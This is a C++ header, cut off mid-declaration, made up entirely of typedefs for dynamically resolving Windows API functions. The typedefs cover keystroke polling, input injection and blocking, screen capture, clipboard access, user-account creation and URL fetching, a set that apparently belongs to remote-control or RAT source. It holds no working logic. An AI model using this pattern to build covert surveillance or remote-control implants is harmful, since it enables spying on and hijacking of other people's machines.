
//#include "Declare.h"   //动态调用库函数

#include <afxwin.h>
#include <tlhelp32.h>
#include <afxinet.h>
#include <lm.h>
#include <Wtsapi32.h>
//#include <io.h>
//#include <Shlobj.h>
//#include <shellapi.h>
//#include <string.h>

 
//#pragma comment(lib, "netapi32.lib")

//#include <afxwin.h>
//#include <process.h>
//#include <Tlhelp32.h>
//#include <Wtsapi32.h>
//#include <wininet.h>
//#include <stdio.h>
//#pragma comment(lib, "Wtsapi32.lib")
//#include "until.h"


//#include <MSTcpIP.h>



/////////////////////////////////////////////////////////////////////////////////////////////////////

//  动态调用函数

/////////////////////////////////////////////////////////////////////////////////////////////////////

typedef HANDLE (WINAPI *CreateEventAT)
(
    __in_opt LPSECURITY_ATTRIBUTES lpEventAttributes,
    __in     BOOL bManualReset,
    __in     BOOL bInitialState,
    __in_opt LPCSTR lpName
    );

typedef BOOL (WINAPI *SetFileAttributesAT)
(
 LPCSTR lpFileName,
 DWORD dwFileAttributes
 );

typedef HANDLE (WINAPI *GetCurrentProcessT)
(
 VOID
 );

typedef BOOL (WINAPI *TerminateThreadT)
(
 __in HANDLE hThread,
 __in DWORD dwExitCode
 );
typedef HANDLE
(WINAPI
*CreateToolhelp32SnapshotT)(
    DWORD dwFlags,
    DWORD th32ProcessID
    );
typedef HANDLE (WINAPI *CreateFileAT)
(
    __in     LPCSTR lpFileName,
    __in     DWORD dwDesiredAccess,
    __in     DWORD dwShareMode,
    __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    __in     DWORD dwCreationDisposition,
    __in     DWORD dwFlagsAndAttributes,
    __in_opt HANDLE hTemplateFile
    );
typedef HANDLE (WINAPI *CreateThreadT)
(
 LPSECURITY_ATTRIBUTES lpThreadAttributes,
 DWORD dwStackSize,
 LPTHREAD_START_ROUTINE lpStartAddress,
 LPVOID lpParameter,
 DWORD dwCreationFlags,
 LPDWORD lpThreadId
 );
typedef BOOL (WINAPI *WriteFileT)
(
    __in        HANDLE hFile,
    __in_bcount(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    __in        DWORD nNumberOfBytesToWrite,
    __out_opt   LPDWORD lpNumberOfBytesWritten,
    __inout_opt LPOVERLAPPED lpOverlapped
    );
typedef DWORD (WINAPI *GetModuleFileNameAT)
(
 HMODULE hModule,
 LPSTR lpFilename,
 DWORD nSize
 );

typedef UINT (WINAPI *GetWindowsDirectoryAT)
(
 __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
 __in UINT uSize
 );
//动态调用 
typedef DWORD (WINAPI *GetTickCountT)
(
 VOID
			  );
//动态调用 
typedef BOOL (WINAPI *DeleteFileAT)
			  (
			  __in LPCSTR lpFileName
			  );

typedef UINT
(WINAPI
*WinExecT)(
    __in LPCSTR lpCmdLine,
    __in UINT uCmdShow
    );

typedef VOID
(WINAPI
*ExitProcessT)(
    __in UINT uExitCode
    );

typedef BOOL
(WINAPI
*CopyFileAT)(
    __in LPCSTR lpExistingFileName,
    __in LPCSTR lpNewFileName,
    __in BOOL bFailIfExists
    );

typedef HANDLE
(WINAPI
*CreateThreadT)(
    __in_opt  LPSECURITY_ATTRIBUTES lpThreadAttributes,
    __in      SIZE_T dwStackSize,
    __in      LPTHREAD_START_ROUTINE lpStartAddress,
    __in_opt  LPVOID lpParameter,
    __in      DWORD dwCreationFlags,
    __out_opt LPDWORD lpThreadId
    );

typedef HANDLE
(WINAPI
*CreateMutexAT)(
    __in_opt LPSECURITY_ATTRIBUTES lpMutexAttributes,
    __in     BOOL bInitialOwner,
    __in_opt LPCSTR lpName
    );

typedef BOOL
(WINAPI
*CreateDirectoryAT)(
    __in     LPCSTR lpPathName,
    __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes
    );

typedef LPSTR
(WINAPI
*lstrcpyAT)(
    __out LPSTR lpString1,
    __in  LPCSTR lpString2
    );

typedef UINT
(WINAPI
*GetWindowsDirectoryAT)(
    __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
    __in UINT uSize
    );

typedef LPSTR
(WINAPI
*lstrcatAT)(
    __inout LPSTR lpString1,
    __in    LPCSTR lpString2
    );

typedef DWORD
(WINAPI
*GetLastErrorT)(
    VOID
    );

typedef VOID
(WINAPI
*SleepT)(
    __in DWORD dwMilliseconds
    );

typedef BOOL
(WINAPI
*FreeLibraryT)(
    __in HMODULE hLibModule
    );

typedef DWORD
(WINAPI
*WaitForSingleObjectT)(
    __in HANDLE hHandle,
    __in DWORD dwMilliseconds
    );

typedef BOOL
(WINAPI
*WriteFileT)(
    __in        HANDLE hFile,
    __in_bcount(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    __in        DWORD nNumberOfBytesToWrite,
    __out_opt   LPDWORD lpNumberOfBytesWritten,
    __inout_opt LPOVERLAPPED lpOverlapped
    );
typedef BOOL
(WINAPI
*CloseHandleT)(
    __in HANDLE hObject
    );
typedef DWORD
(WINAPI
*WaitForSingleObjectT)(
    __in HANDLE hHandle,
    __in DWORD dwMilliseconds
    );
typedef UINT
(WINAPI
*GetSystemDirectoryAT)(
    __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
    __in UINT uSize
    );
typedef BOOL
(WINAPI
*SetFileAttributesAT)(
    __in LPCSTR lpFileName,
    __in DWORD dwFileAttributes
    );
typedef HANDLE
(WINAPI
*OpenEventAT)(
    __in DWORD dwDesiredAccess,
    __in BOOL bInheritHandle,
    __in LPCSTR lpName
    );
typedef UINT
(WINAPI
*SetErrorModeT)(
    __in UINT uMode
    );

typedef DWORD
(WINAPI
*GetCurrentThreadIdT)(
    VOID
    );
typedef HMODULE
(WINAPI
*GetModuleHandleAT)(
    __in_opt LPCSTR lpModuleName
    );
typedef BOOL
(WINAPI
*GetInputStateT)(
    VOID);

typedef BOOL
(WINAPI
*PostThreadMessageAT)(
    __in DWORD idThread,
    __in UINT Msg,
    __in WPARAM wParam,
    __in LPARAM lParam);
typedef BOOL
(WINAPI
*GetMessageAT)(
    __out LPMSG lpMsg,
    __in_opt HWND hWnd,
    __in UINT wMsgFilterMin,
    __in UINT wMsgFilterMax);
typedef BOOL
(WINAPI
*DeleteFileAT)(
    __in LPCSTR lpFileName
    );
typedef BOOL
(WINAPI
*ReleaseMutexT)(
    __in HANDLE hMutex
    );
typedef DWORD
(WINAPI
*ExpandEnvironmentStringsAT)(
    __in LPCSTR lpSrc,
    __out_ecount_part_opt(nSize, return) LPSTR lpDst,
    __in DWORD nSize
    );
typedef BOOL
(WINAPI
*CloseHandleT)(
    __in HANDLE hObject
    );
typedef BOOL
(WINAPI
*DuplicateHandleT)(
    __in        HANDLE hSourceProcessHandle,
    __in        HANDLE hSourceHandle,
    __in        HANDLE hTargetProcessHandle,
    __deref_out LPHANDLE lpTargetHandle,
    __in        DWORD dwDesiredAccess,
    __in        BOOL bInheritHandle,
    __in        DWORD dwOptions
    );
typedef BOOL
(WINAPI
*CreateDirectoryAT)(
    __in     LPCSTR lpPathName,
    __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes
    );
typedef int
(WINAPI
*lstrlenAT)(
    __in LPCSTR lpString
    );
typedef DWORD
(WINAPI
*GetLastErrorT)(
    VOID
    );
typedef VOID
(WINAPI
*GetLocalTimeT)(
    __out LPSYSTEMTIME lpSystemTime
    );
typedef BOOL
(WINAPI
*Process32FirstT)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
    );
typedef BOOL
(WINAPI
*Process32NextT)(
    HANDLE hSnapshot,
    LPPROCESSENTRY32 lppe
    );
typedef HANDLE
(WINAPI
*OpenProcessT)(
    __in DWORD dwDesiredAccess,
    __in BOOL bInheritHandle,
    __in DWORD dwProcessId
    );
typedef BOOL
(WINAPI
*TerminateProcessT)(
    __in HANDLE hProcess,
    __in UINT uExitCode
    );
typedef HANDLE
(WINAPI
*GetCurrentProcessT)(
    VOID
    );
typedef DWORD
(WINAPI
*SetFilePointerT)(
    __in     HANDLE hFile,
    __in     LONG lDistanceToMove,
    __in_opt PLONG lpDistanceToMoveHigh,
    __in     DWORD dwMoveMethod
    );
typedef HANDLE
(WINAPI
*CreateFileAT)(
    __in     LPCSTR lpFileName,
    __in     DWORD dwDesiredAccess,
    __in     DWORD dwShareMode,
    __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    __in     DWORD dwCreationDisposition,
    __in     DWORD dwFlagsAndAttributes,
    __in_opt HANDLE hTemplateFile
    );
typedef DWORD
(WINAPI
*GetFileSizeT)(
    __in      HANDLE hFile,
    __out_opt LPDWORD lpFileSizeHigh
    );
typedef DWORD
(WINAPI
*GetEnvironmentVariableAT)(
    __in LPCSTR lpName,
    __out_ecount_part_opt(nSize, return + 1) LPSTR lpBuffer,
    __in DWORD nSize
    );

typedef SIZE_T
(WINAPI
*LocalSizeT)(
    __in HLOCAL hMem
    );

typedef HLOCAL
(WINAPI
*LocalFreeT)(
    __deref HLOCAL hMem
    );

typedef BOOL
(WINAPI
*OpenProcessTokenT)(
    __in        HANDLE ProcessHandle,
    __in        DWORD DesiredAccess,
    __deref_out PHANDLE TokenHandle
    );

typedef VOID
(WINAPI
*OutputDebugStringAT)(
    __in LPCSTR lpOutputString
    );

typedef BOOL
(WINAPI
*AdjustTokenPrivilegesT)(
    __in      HANDLE TokenHandle,
    __in      BOOL DisableAllPrivileges,
    __in_opt  PTOKEN_PRIVILEGES NewState,
    __in      DWORD BufferLength,
    __out_bcount_part_opt(BufferLength, *ReturnLength) PTOKEN_PRIVILEGES PreviousState,
    __out_opt PDWORD ReturnLength
    );

typedef HLOCAL
(WINAPI
*LocalAllocT)(
    __in UINT uFlags,
    __in SIZE_T uBytes
    );

typedef BOOL
(WINAPI
*LookupPrivilegeValueAT)(
    __in_opt LPCSTR lpSystemName,
    __in     LPCSTR lpName,
    __out    PLUID   lpLuid
    );

typedef SC_HANDLE
(WINAPI
*OpenSCManagerAT)(
    __in_opt        LPCSTR                lpMachineName,
    __in_opt        LPCSTR                lpDatabaseName,
    __in            DWORD                   dwDesiredAccess
    );

typedef HLOCAL
(WINAPI
*LocalReAllocT)(
    __in HLOCAL hMem,
    __in SIZE_T uBytes,
    __in UINT uFlags
    );

typedef int
(WINAPIV
*wsprintfAT)(
    __out LPSTR,
    __in __format_string LPCSTR,
    ...);

typedef BOOL
(WINAPI
*ExitWindowsExT)(
    __in UINT uFlags,
    __in DWORD dwReason);

typedef int
(WINAPI
*GetWindowTextAT)(
    __in HWND hWnd,
    __out_ecount(nMaxCount) LPSTR lpString,
    __in int nMaxCount);

typedef DWORD
(WINAPI
*GetWindowThreadProcessIdT)(
    __in HWND hWnd,
    __out_opt LPDWORD lpdwProcessId);

typedef BOOL
(WINAPI
*GetComputerNameAT)(
    __out_ecount_part(*nSize, *nSize + 1) LPSTR lpBuffer,
    __inout LPDWORD nSize
    );

typedef VOID
(WINAPI
*InitializeCriticalSectionT)(
    __out LPCRITICAL_SECTION lpCriticalSection
    );

typedef VOID
(WINAPI
*DeleteCriticalSectionT)(
    __inout LPCRITICAL_SECTION lpCriticalSection
    );

typedef BOOL
(WINAPI
*VirtualFreeT)(
    __in LPVOID lpAddress,
    __in SIZE_T dwSize,
    __in DWORD dwFreeType
    );

typedef VOID
(WINAPI
*EnterCriticalSectionT)(
    __inout LPCRITICAL_SECTION lpCriticalSection
    );

typedef VOID
(WINAPI
*LeaveCriticalSectionT)(
    __inout LPCRITICAL_SECTION lpCriticalSection
    );

typedef LPVOID
(WINAPI
*VirtualAllocT)(
    __in_opt LPVOID lpAddress,
    __in     SIZE_T dwSize,
    __in     DWORD flAllocationType,
    __in     DWORD flProtect
    );

typedef int
(WINAPI
*WideCharToMultiByteT)(
    __in UINT     CodePage,
    __in DWORD    dwFlags,
    __in_opt LPCWSTR  lpWideCharStr,
    __in int      cchWideChar,
    __out_bcount_opt(cbMultiByte) LPSTR   lpMultiByteStr,
    __in int      cbMultiByte,
    __in_opt LPCSTR   lpDefaultChar,
    __out_opt LPBOOL  lpUsedDefaultChar);

typedef LONG
(WINAPI
*InterlockedExchangeT)(
    __inout LONG volatile *Target,
    __in    LONG Value
    );

typedef BOOL
(WINAPI
*SetEventT)(
    __in HANDLE hEvent
    );

typedef BOOL
(WINAPI
*ResetEventT)(
    __in HANDLE hEvent
    );

typedef BOOL
(WINAPI
*CancelIoT)(
    __in HANDLE hFile
    );

typedef BOOL
(WINAPI 
*SHGetSpecialFolderPathAT)(
HWND hwnd, LPSTR 
pszPath, int csidl, 
BOOL fCreate);

typedef DWORD
(WINAPI
*GetPrivateProfileSectionNamesAT)(
    __out_ecount_part_opt(nSize, return + 1) LPSTR lpszReturnBuffer,
    __in     DWORD nSize,
    __in_opt LPCSTR lpFileName
    );

typedef BOOL
(WINAPI
*LookupAccountNameAT)(
    __in_opt LPCSTR lpSystemName,
    __in     LPCSTR lpAccountName,
    __out_bcount_part_opt(*cbSid, *cbSid) PSID Sid,
    __inout  LPDWORD cbSid,
    __out_ecount_part_opt(*cchReferencedDomainName, *cchReferencedDomainName + 1) LPSTR ReferencedDomainName,
    __inout  LPDWORD cchReferencedDomainName,
    __out    PSID_NAME_USE peUse
    );

typedef int
(WINAPI
*MultiByteToWideCharT)(
    __in UINT     CodePage,
    __in DWORD    dwFlags,
    __in LPCSTR   lpMultiByteStr,
    __in int      cbMultiByte,
    __out_ecount_opt(cchWideChar) LPWSTR  lpWideCharStr,
    __in int      cchWideChar);

typedef DWORD
(WINAPI
*GetPrivateProfileStringAT)(
    __in_opt LPCSTR lpAppName,
    __in_opt LPCSTR lpKeyName,
    __in_opt LPCSTR lpDefault,
    __out_ecount_part_opt(nSize, return + 1) LPSTR lpReturnedString,
    __in     DWORD nSize,
    __in_opt LPCSTR lpFileName
    );

typedef int
(WINAPI
*lstrcmpAT)(
    __in LPCSTR lpString1,
    __in LPCSTR lpString2
    );

typedef BOOL
(WINAPI
*GetVersionExAT)(
    __inout LPOSVERSIONINFOA lpVersionInformation
    );

typedef BOOL
(WINAPI
*FindNextFileAT)(
    __in  HANDLE hFindFile,
    __out LPWIN32_FIND_DATAA lpFindFileData
    );

typedef BOOL
(WINAPI
*CreateProcessAT)(
    __in_opt    LPCSTR lpApplicationName,
    __inout_opt LPSTR lpCommandLine,
    __in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    __in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    __in        BOOL bInheritHandles,
    __in        DWORD dwCreationFlags,
    __in_opt    LPVOID lpEnvironment,
    __in_opt    LPCSTR lpCurrentDirectory,
    __in        LPSTARTUPINFOA lpStartupInfo,
    __out       LPPROCESS_INFORMATION lpProcessInformation
    );

typedef DWORD_PTR
(WINAPI
*SHGetFileInfoAT)(
LPCSTR pszPath, 
DWORD dwFileAttributes, 
SHFILEINFOA *psfi, 
UINT cbFileInfo, 
UINT uFlags);

typedef DWORD
(WINAPI
*GetFileAttributesAT)(
    __in LPCSTR lpFileName
    );

typedef DWORD
(WINAPI
*GetLogicalDriveStringsAT)(
    __in DWORD nBufferLength,
    __out_ecount_part_opt(nBufferLength, return + 1) LPSTR lpBuffer
    );

typedef BOOL
(WINAPI
*GetVolumeInformationAT)(
    __in_opt  LPCSTR lpRootPathName,
    __out_ecount_opt(nVolumeNameSize) LPSTR lpVolumeNameBuffer,
    __in      DWORD nVolumeNameSize,
    __out_opt LPDWORD lpVolumeSerialNumber,
    __out_opt LPDWORD lpMaximumComponentLength,
    __out_opt LPDWORD lpFileSystemFlags,
    __out_ecount_opt(nFileSystemNameSize) LPSTR lpFileSystemNameBuffer,
    __in      DWORD nFileSystemNameSize
    );

typedef BOOL
(WINAPI
*GetDiskFreeSpaceExAT)(
    __in_opt  LPCSTR lpDirectoryName,
    __out_opt PULARGE_INTEGER lpFreeBytesAvailableToCaller,
    __out_opt PULARGE_INTEGER lpTotalNumberOfBytes,
    __out_opt PULARGE_INTEGER lpTotalNumberOfFreeBytes
    );

typedef UINT
(WINAPI
*GetDriveTypeAT)(
    __in_opt LPCSTR lpRootPathName
    );

typedef BOOL
(WINAPI
*FindCloseT)(
    __inout HANDLE hFindFile
    );

typedef BOOL
(WINAPI
*ReadFileT)(
    __in        HANDLE hFile,
    __out_bcount_part(nNumberOfBytesToRead, *lpNumberOfBytesRead) LPVOID lpBuffer,
    __in        DWORD nNumberOfBytesToRead,
    __out_opt   LPDWORD lpNumberOfBytesRead,
    __inout_opt LPOVERLAPPED lpOverlapped
    );

typedef HANDLE
(WINAPI
*FindFirstFileAT)(
    __in  LPCSTR lpFileName,
    __out LPWIN32_FIND_DATAA lpFindFileData
    );

typedef BOOL
(WINAPI
*RemoveDirectoryAT)(
    __in LPCSTR lpPathName
    );

typedef LONG
(APIENTRY
*RegOpenKeyAT)(
    __in HKEY hKey,
    __in_opt LPCSTR lpSubKey,
    __out PHKEY phkResult
    );

typedef LONG
(APIENTRY
*RegOpenKeyExAT)(
    __in HKEY hKey,
    __in_opt LPCSTR lpSubKey,
    __reserved DWORD ulOptions,
    __in REGSAM samDesired,
    __out PHKEY phkResult
    );

typedef LONG
(APIENTRY
*RegCloseKeyT)(
    __in HKEY hKey
    );

typedef LRESULT
(WINAPI
*SendMessageAT)(
    __in HWND hWnd,
    __in UINT Msg,
    __in WPARAM wParam,
    __in LPARAM lParam);

typedef VOID
(WINAPI
*keybd_eventT)(
    __in BYTE bVk,
    __in BYTE bScan,
    __in DWORD dwFlags,
    __in ULONG_PTR dwExtraInfo);

typedef UINT
(WINAPI
*MapVirtualKeyAT)(
    __in UINT uCode,
    __in UINT uMapType);

typedef HGLOBAL
(WINAPI
*GlobalAllocT)(
    __in UINT uFlags,
    __in SIZE_T dwBytes
    );

typedef LPVOID
(WINAPI
*GlobalLockT)(
    __in HGLOBAL hMem
    );

typedef BOOL
(WINAPI
*GlobalUnlockT)(
    __in HGLOBAL hMem
    );

typedef HGLOBAL
(WINAPI
*GlobalFreeT)(
    __deref HGLOBAL hMem
    );

typedef SIZE_T
(WINAPI
*GlobalSizeT)(
    __in HGLOBAL hMem
    );

typedef BOOL
(WINAPI
*GetCursorPosT)(
    __out LPPOINT lpPoint);

typedef BOOL
(WINAPI
*CreatePipeT)(
    __out_ecount_full(1) PHANDLE hReadPipe,
    __out_ecount_full(1) PHANDLE hWritePipe,
    __in_opt LPSECURITY_ATTRIBUTES lpPipeAttributes,
    __in     DWORD nSize
    );

typedef VOID
(WINAPI
*GetStartupInfoAT)(
    __out LPSTARTUPINFOA lpStartupInfo
    );

typedef BOOL
(WINAPI
*PeekNamedPipeT)(
    __in      HANDLE hNamedPipe,
    __out_bcount_part_opt(nBufferSize, *lpBytesRead) LPVOID lpBuffer,
    __in      DWORD nBufferSize,
    __out_opt LPDWORD lpBytesRead,
    __out_opt LPDWORD lpTotalBytesAvail,
    __out_opt LPDWORD lpBytesLeftThisMessage
    );

typedef BOOL
(WINAPI
*DisconnectNamedPipeT)(
    __in HANDLE hNamedPipe
    );

typedef DWORD
(WINAPI
*WaitForMultipleObjectsT)(
    __in DWORD nCount,
    __in_ecount(nCount) CONST HANDLE *lpHandles,
    __in BOOL bWaitAll,
    __in DWORD dwMilliseconds
    );

typedef int
(WINAPI
*lstrcmpiAT)(
    __in LPCSTR lpString1,
    __in LPCSTR lpString2
    );

typedef BOOL
(WINAPI
*CloseHandleT)(
    __in HANDLE hObject
    );

typedef BOOL
(WINAPI
*CloseWindowT)(
    __in  HWND hWnd);

typedef BOOL
(WINAPI
*GetCursorInfoT)(
    __inout PCURSORINFO pci);

typedef VOID
(WINAPI
*GetSystemInfoT)(
    __out LPSYSTEM_INFO lpSystemInfo
    );

typedef BOOL
(WINAPI
*GlobalMemoryStatusExT)(
    __out LPMEMORYSTATUSEX lpBuffer
    );

typedef BOOL
(WINAPI
*DeviceIoControlT)(
    __in        HANDLE hDevice,
    __in        DWORD dwIoControlCode,
    __in_bcount_opt(nInBufferSize) LPVOID lpInBuffer,
    __in        DWORD nInBufferSize,
    __out_bcount_part_opt(nOutBufferSize, *lpBytesReturned) LPVOID lpOutBuffer,
    __in        DWORD nOutBufferSize,
    __out_opt   LPDWORD lpBytesReturned,
    __inout_opt LPOVERLAPPED lpOverlapped
    );

typedef DWORD
(WINAPI
*GetVersionT)(
    VOID
    );

typedef int
(WINAPI
*MessageBoxAT)(
    __in_opt HWND hWnd,
    __in_opt LPCSTR lpText,
    __in_opt LPCSTR lpCaption,
    __in UINT uType);

typedef LONG
(APIENTRY
*RegCreateKeyAT)(
    __in HKEY hKey,
    __in_opt LPCSTR lpSubKey,
    __out PHKEY phkResult
    );

typedef LONG
(APIENTRY
*RegSetValueExAT)(
    __in HKEY hKey,
    __in_opt LPCSTR lpValueName,
    __reserved DWORD Reserved,
    __in DWORD dwType,
    __in_bcount_opt(cbData) CONST BYTE* lpData,
    __in DWORD cbData
    );

typedef LONG
(APIENTRY
*RegQueryValueExAT)(
    __in HKEY hKey,
    __in_opt LPCSTR lpValueName,
    __reserved LPDWORD lpReserved,
    __out_opt LPDWORD lpType,
    __out_bcount_opt(*lpcbData) LPBYTE lpData,
    __inout_opt LPDWORD lpcbData
    );

typedef BOOL
(WINAPI
*MoveFileAT)(
    __in LPCSTR lpExistingFileName,
    __in LPCSTR lpNewFileName
    );

typedef BOOL
(WINAPI
*CloseClipboardT)(
    VOID);

typedef HDESK
(WINAPI
*OpenInputDesktopT)(
    __in DWORD dwFlags,
    __in BOOL fInherit,
    __in ACCESS_MASK dwDesiredAccess);

typedef BOOL
(WINAPI
*BlockInputT)(
    BOOL fBlockIt
);

typedef BOOL 
(WINAPI 
*InternetCloseHandleT)(
    __in HINTERNET hInternet
    );

typedef BOOL 
(WINAPI 
*InternetReadFileT)(
    __in HINTERNET hFile,
    __out_bcount(dwNumberOfBytesToRead) LPVOID lpBuffer,
    __in DWORD dwNumberOfBytesToRead,
    __out LPDWORD lpdwNumberOfBytesRead
    );

typedef HINTERNET 
(WINAPI
*InternetOpenUrlAT)(
    __in HINTERNET hInternet,
    __in LPCSTR lpszUrl,
    __in_ecount_opt(dwHeadersLength) LPCSTR lpszHeaders,
    __in DWORD dwHeadersLength,
    __in DWORD dwFlags,
    __in_opt DWORD_PTR dwContext
    );

typedef HINTERNET 
(WINAPI
*InternetOpenAT)(
    __in_opt LPCSTR lpszAgent,
    __in DWORD dwAccessType,
    __in_opt LPCSTR lpszProxy,
    __in_opt LPCSTR lpszProxyBypass,
    __in DWORD dwFlags
    );

typedef NET_API_STATUS
(WINAPI
*NetUserDelT)(
    IN  LPCWSTR    servername OPTIONAL,
    IN  LPCWSTR    username
    );

typedef NET_API_STATUS
(WINAPI
*NetUserSetInfoT)(
    IN  LPCWSTR    servername OPTIONAL,
    IN  LPCWSTR    username,
    IN  DWORD     level,
    IN  LPBYTE    buf,
    OUT LPDWORD   parm_err OPTIONAL
    );

typedef NET_API_STATUS
(WINAPI
*NetUserGetLocalGroupsT)(
    IN  LPCWSTR    servername OPTIONAL,
    IN  LPCWSTR    username,
    IN  DWORD     level,
    IN  DWORD     flags,
    OUT LPBYTE    *bufptr,
    IN  DWORD     prefmaxlen,
    OUT LPDWORD   entriesread,
    OUT LPDWORD   totalentries
    );

typedef NET_API_STATUS
(WINAPI
*NetApiBufferFreeT)(
    IN LPVOID Buffer
    );

typedef NET_API_STATUS
(WINAPI
*NetUserGetInfoT)(
    IN  LPCWSTR     servername OPTIONAL,
    IN  LPCWSTR     username,
    IN  DWORD      level,
    OUT LPBYTE     *bufptr
    );

typedef NET_API_STATUS
(WINAPI
*NetUserEnumT)(
    IN  LPCWSTR     servername OPTIONAL,
    IN  DWORD      level,
    IN  DWORD      filter,
    OUT LPBYTE     *bufptr,
    IN  DWORD      prefmaxlen,
    OUT LPDWORD    entriesread,
    OUT LPDWORD    totalentries,
    IN OUT LPDWORD resume_handle OPTIONAL
    );

typedef NET_API_STATUS
(WINAPI
*NetLocalGroupAddMembersT)(
    IN  LPCWSTR     servername OPTIONAL,
    IN  LPCWSTR     groupname,
    IN  DWORD      level,
    IN  LPBYTE     buf,
    IN  DWORD      totalentries
    );

typedef NET_API_STATUS
(WINAPI
*NetUserAddT)(
    IN  LPCWSTR     servername OPTIONAL,
    IN  DWORD      level,
    IN  LPBYTE     buf,
    OUT LPDWORD    parm_err OPTIONAL
    );

typedef VOID
(WINAPI
*WTSFreeMemoryT)(
    IN PVOID pMemory
    );

typedef BOOL
(WINAPI
*WTSQuerySessionInformationAT)(
    IN HANDLE hServer,
    IN DWORD SessionId,
    IN WTS_INFO_CLASS WTSInfoClass,
    OUT LPSTR * ppBuffer,
    OUT DWORD * pBytesReturned
    );

typedef DWORD
(WINAPI
*GetModuleFileNameExAT)(
    HANDLE hProcess,
    HMODULE hModule,
    LPSTR lpFilename,
    DWORD nSize
    );

typedef BOOL
(WINAPI
*EnumProcessModulesT)(
    HANDLE hProcess,
    HMODULE *lphModule,
    DWORD cb,
    LPDWORD lpcbNeeded
    );

typedef HINSTANCE
(WINAPI
*ShellExecuteAT)(
    HWND hwnd, 
    LPCSTR lpOperation, 
    LPCSTR lpFile, 
    LPCSTR lpParameters,
    LPCSTR lpDirectory, 
    INT nShowCmd);

typedef LPSTR
(WINAPI
*CharNextAT)(
    __in LPCSTR lpsz);

typedef BOOL
(WINAPI
*IsWindowVisibleT)(
    __in HWND hWnd);

typedef HWND
(WINAPI
*GetForegroundWindowT)(
    VOID);

typedef SHORT
(WINAPI
*GetAsyncKeyStateT)(
    __in int vKey);

typedef SHORT
(WINAPI
*GetKeyStateT)(
    __in int nVirtKey);

typedef BOOL
(WINAPI
*SystemParametersInfoAT)(
    __in UINT uiAction,
    __in UINT uiParam,
    __inout_opt PVOID pvParam,
    __in UINT fWinIni);

typedef VOID
(WINAPI
*mouse_eventT)(
    __in DWORD dwFlags,
    __in DWORD dx,
    __in DWORD dy,
    __in DWORD dwData,
    __in ULONG_PTR dwExtraInfo);

typedef HWND
(WINAPI
*SetCaptureT)(
    __in HWND hWnd);

typedef HWND
(WINAPI
*WindowFromPointT)(
    __in POINT Point);

typedef BOOL
(WINAPI
*SetCursorPosT)(
    __in int X,
    __in int Y);

typedef HANDLE
(WINAPI
*SetClipboardDataT)(
    __in UINT uFormat,
    __in_opt HANDLE hMem);

typedef BOOL
(WINAPI
*EmptyClipboardT)(
    VOID);

typedef HANDLE
(WINAPI
*GetClipboardDataT)(
    __in UINT uFormat);

typedef HDC
(WINAPI
*GetDCT)(
    __in_opt HWND hWnd);

typedef HWND
(WINAPI
*GetDesktopWindowT)(
    VOID);

typedef int
(WINAPI
*ReleaseDCT)(
    __in_opt HWND hWnd,
    __in HDC hDC);

typedef BOOL
(WINAPI
*CloseDesktopT)(
    __in HDESK hDesktop);

typedef BOOL
(WINAPI
*SetThreadDesktopT)(
     __in HDESK hDesktop);

typedef BOOL
(WINAPI
*GetUserObjectInformationAT)(
    __in HANDLE hObj,
    __in int nIndex,
    __out_bcount_opt(nLength) PVOID pvInfo,
    __in DWORD nLength,
    __out_opt LPDWORD lpnLengthNeeded);

typedef HDESK
(WINAPI
*GetThreadDesktopT)(
    __in DWORD dwThreadId);

typedef HDESK
(WINAPI
*OpenDesktopAT)(
    __in LPCSTR lpszDesktop,
    __in DWORD dwFlags,
    __in BOOL fInherit,
    __in ACCESS_MASK dwDesiredAccess);

typedef BOOL
(WINAPI
*PostMessageAT)(
    __in_opt HWND hWnd,
    __in UINT Msg,
    __in WPARAM wParam,
    __in LPARAM lParam);

typedef BOOL
(WINAPI
*EnumWindowsT)(
    __in WNDENUMPROC lpEnumFunc,
    __in LPARAM lParam);

typedef int
(WINAPI
*GetSystemMetricsT)(
    __in int nIndex);

typedef BOOL
(WINAPI
*OpenClipboardT)(
    __in_opt HWND hWndNewOwner);

typedef HGDIOBJ 
(WINAPI 
*SelectObjectT)(
    __in HDC hdc, 
    __in HGDIOBJ h);

typedef HBITMAP 
(WINAPI 
*CreateDIBSectionT)(
    __in_opt HDC hdc, 
    __in CONST BITMAPINFO *lpbmi, 
    __in UINT usage, 
    __deref_opt_out VOID **ppvBits, 
    __in_opt HANDLE hSection, 
    __in DWORD offset);

typedef HDC     
(WINAPI 
*CreateCompatibleDCT)(
    __in_opt HDC hdc);

typedef BOOL 
(WINAPI 
*DeleteObjectT)(
    __in HGDIOBJ ho);

typedef BOOL 
(WINAPI 
*DeleteDCT)(
    __in HDC hdc);

typedef BOOL	
(WINAPI 
*BitBltT)(
__in HDC hdc, 
__in int x, 
__in int y, 
__in int cx, 
__in int cy, 
__in_opt HDC hdcSrc, 
__in int x1, 
__in int y1, 
__in DWORD rop);

typedef int   
(WINAPI 
*GetDIBitsT)(
__in HDC hdc, 
__in HBITMAP hbm, 
__in UINT start, 
__in UINT cLines,  
__out_opt LPVOID lpvBits, 
__inout LPBITMAPINFO lpbmi, 
__in UINT usage);

typedef HBITMAP 
(WINAPI 
*CreateCompatibleBitmapT)(
__in HDC hdc, 
__in int cx, 
__in int cy);

typedef BOOL
(WINAPI
*StartServiceCtrlDispatcherAT)(
    __in CONST  SERVICE_TABLE_ENTRYA    *lpServiceStartTable
    );

typedef DWORD
(WINAPI
*GetShortPathNameAT)(
    __in LPCSTR lpszLongPath,
    __out_ecount_part(cchBuffer, return + 1) LPSTR  lpszShortPath,
    __in DWORD cchBuffer
    );

typedef BOOL
(WINAPI
*SetPriorityClassT)(
    __in HANDLE hProcess,
    __in DWORD dwPriorityClass
    );

typedef HANDLE
(WINAPI
*GetCurrentThreadT)(
    VOID
    );

typedef BOOL
(WINAPI
*SetThreadPriorityT)(
    __in HANDLE hThread,
    __in int nPriority
    );

typedef DWORD
(WINAPI
*ResumeThreadT)(
    __in HANDLE hThread
    );

typedef BOOL
(WINAPI
*SetRectT)(
